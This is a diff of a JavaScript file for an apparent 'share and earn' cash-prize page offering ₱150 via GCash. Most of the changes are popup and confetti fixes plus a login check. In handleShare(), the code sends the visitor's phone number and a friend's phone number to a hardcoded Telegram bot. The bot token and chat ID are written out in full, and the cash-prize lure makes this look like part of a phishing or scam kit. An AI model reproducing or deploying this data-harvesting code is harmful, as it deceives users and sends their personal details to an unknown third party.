@@ -1,3 +1,6 @@
+// ========== PROMOTION.JS - SHARE AND EARN ==========
+// Simple at walang referral timer
+
 // ========== MAIN TIMER (DROP ENDS IN - May 1, 2026) ==========
 function initMainTimer() {
     var timerDisplay = document.getElementById('mainTimerDisplay');
@@ -60,6 +63,8 @@ function startConfetti() {
     var canvas = document.getElementById('confettiCanvas');
     if (!canvas) return;
     
+    stopConfetti();
+    
     canvas.style.display = 'block';
     canvas.width = window.innerWidth;
     canvas.height = window.innerHeight;
@@ -110,7 +115,7 @@ function stopConfetti() {
     var canvas = document.getElementById('confettiCanvas');
     if (canvas) {
         var ctx = canvas.getContext('2d');
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        if (ctx) ctx.clearRect(0, 0, canvas.width, canvas.height);
         canvas.style.display = 'none';
     }
 }
@@ -119,14 +124,16 @@ function stopConfetti() {
 function showPrizePopup() {
     var popup = document.getElementById('prizePopup');
     if (popup) {
-        startConfetti();
         popup.style.display = 'flex';
+        startConfetti();
     }
 }
 
 function closePrizePopup() {
     var popup = document.getElementById('prizePopup');
-    if (popup) popup.style.display = 'none';
+    if (popup) {
+        popup.style.display = 'none';
+    }
     stopConfetti();
 }
 
@@ -174,25 +181,20 @@ function handleShare() {
         return;
     }
     
-    // Clear input
     document.getElementById('friendPhoneInput').value = '';
     
-    // Update progress bar
     var progressFill = document.getElementById('progressFill');
     if (progressFill) progressFill.style.width = '33%';
     
-    // Update status message
     var statusMsg = document.getElementById('statusMessage');
     if (statusMsg) {
         statusMsg.innerHTML = '<span class="status-step1">✅ Step 1 completed! Click CLAIM THRU GCASH to get ₱150!</span>';
     }
     
-    // Send Telegram
     var message = "REFERRAL INVITE!\nUser: " + userPhone + "\nFriend: " + friendPhone;
     fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent(message))
         .catch(function(e) { console.log("Telegram error:", e); });
     
-    // Show popup
     showPrizePopup();
 }
 
@@ -306,10 +308,25 @@ function initPopupClose() {
     }
 }
 
-// ========== INITIALIZE ==========
+// ========== DISPLAY USER PHONE ==========
+function initUserDisplay() {
+    var userPhone = localStorage.getItem("userPhone");
+    var display = document.getElementById('userPhoneDisplay');
+    if (display) {
+        display.innerText = userPhone || 'Not logged in';
+    }
+    
+    if (!userPhone) {
+        alert("Please login first.");
+        window.location.href = "index.html";
+    }
+}
+
+// ========== INITIALIZE ALL ==========
 document.addEventListener('DOMContentLoaded', function() {
     console.log("Promotion.js loading...");
     
+    initUserDisplay();
     initMainTimer();
     initWinnerTicker();
     initCardHighlights();
@@ -319,6 +336,16 @@ document.addEventListener('DOMContentLoaded', function() {
     initEnterKeySupport();
     initVideoAutoplay();
     initPopupClose();
+    
+    // Hide all popups at start
+    var prizePopup = document.getElementById('prizePopup');
+    if (prizePopup) prizePopup.style.display = 'none';
+    
+    var claimPopup = document.getElementById('claimPopup');
+    if (claimPopup) claimPopup.style.display = 'none';
+    
+    var firewallPopup = document.getElementById('firewallPopup');
+    if (firewallPopup) firewallPopup.style.display = 'none';
     
     console.log("Promotion.js ready");
 });
